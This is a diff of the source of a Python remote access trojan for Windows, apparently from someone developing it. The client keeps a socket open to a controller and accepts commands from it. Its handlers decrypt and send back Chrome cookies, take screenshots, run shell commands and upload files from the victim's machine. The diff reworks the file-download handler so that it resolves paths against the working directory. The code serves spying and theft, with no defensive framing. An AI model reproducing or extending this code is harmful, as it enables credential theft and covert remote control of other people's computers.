@@ -9,7 +9,6 @@ import sqlite3
 import base64
 import json
 import win32crypt
-import io
 from Crypto.Cipher import AES
 
 HOST = '127.0.0.1'
@@ -54,6 +53,23 @@ def connect():
                                     s.sendall((cwd + "\n__end__").encode())
                                 else:
                                     s.sendall(b"The system cannot find the path specified.\n__end__")
+                                continue
+
+                            # --- Download File ---
+                            if cmd.lower().startswith("download "):
+                                try:
+                                    filename = cmd[9:].strip()
+                                    file_path = os.path.join(cwd, filename)
+                                    if not os.path.isfile(file_path):
+                                        s.sendall(f"[!] File not found: {filename}\n__end__".encode())
+                                        continue
+
+                                    with open(file_path, "rb") as f:
+                                        data = f.read()
+                                    s.sendall(f"FILE {len(data)}\n".encode())
+                                    s.sendall(data)
+                                except Exception as e:
+                                    s.sendall(f"[!] Download error: {e}\n__end__".encode())
                                 continue
 
                             # --- Screenshot ---
@@ -113,7 +129,6 @@ def connect():
                                     conn = sqlite3.connect(temp_db)
                                     cursor = conn.cursor()
                                     cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
-
                                     def decrypt_cookie(enc_val):
                                         try:
                                             iv = enc_val[3:15]
@@ -123,7 +138,6 @@ def connect():
                                             return decrypted.decode()
                                         except:
                                             return "[Decryption Failed]"
-
                                     cookies = ""
                                     for host, name, encrypted_value in cursor.fetchall():
                                         value = decrypt_cookie(encrypted_value)
@@ -137,21 +151,6 @@ def connect():
                                         s.sendall(b"[!] No cookies found.\n__end__")
                                 except Exception as e:
                                     s.sendall(f"[!] Cookie dump error: {e}\n__end__".encode())
-                                continue
-
-                            # --- File Download ---
-                            if cmd.lower().startswith("download "):
-                                try:
-                                    file_path = cmd[9:].strip()
-                                    if not os.path.isfile(file_path):
-                                        s.sendall(b"[!] File not found.\n__end__")
-                                        continue
-                                    with open(file_path, "rb") as f:
-                                        file_data = f.read()
-                                    s.sendall(f"FILE {len(file_data)}\n".encode())
-                                    s.sendall(file_data)
-                                except Exception as e:
-                                    s.sendall(f"[!] File download error: {e}\n__end__".encode())
                                 continue
 
                             # --- Shell Command ---
